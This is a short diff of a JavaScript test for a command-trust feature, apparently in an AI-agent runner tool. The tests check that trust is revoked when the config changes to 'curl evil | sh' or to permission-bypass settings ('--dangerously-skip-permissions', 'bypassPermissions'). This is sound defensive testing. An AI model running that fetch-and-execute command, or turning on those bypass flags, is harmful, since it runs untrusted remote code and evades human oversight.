@@ -105,6 +105,9 @@ test('0.22.0: run.allow и stand.command действуют только пос�
   trustCommands(dir, cfg);
   assert.equal(commandsTrusted(dir, cfg), true);
   assert.equal(commandsTrusted(dir, { ...cfg, stand: { ...cfg.stand, command: 'curl evil | sh' } }), false);
+  assert.equal(commandsTrusted(dir, { ...cfg, run: { ...cfg.run, extra_args: ['--dangerously-skip-permissions'] } }), false);
+  assert.equal(commandsTrusted(dir, { ...cfg, run: { ...cfg.run, permission_mode: 'bypassPermissions' } }), false);
+  assert.equal(commandsTrusted(dir, { ...DEFAULT_CONFIG, run: { ...DEFAULT_CONFIG.run, permission_mode: 'acceptEdits' } }), true);
   delete process.env.MCFLY_TRUST_FILE;
 });
 
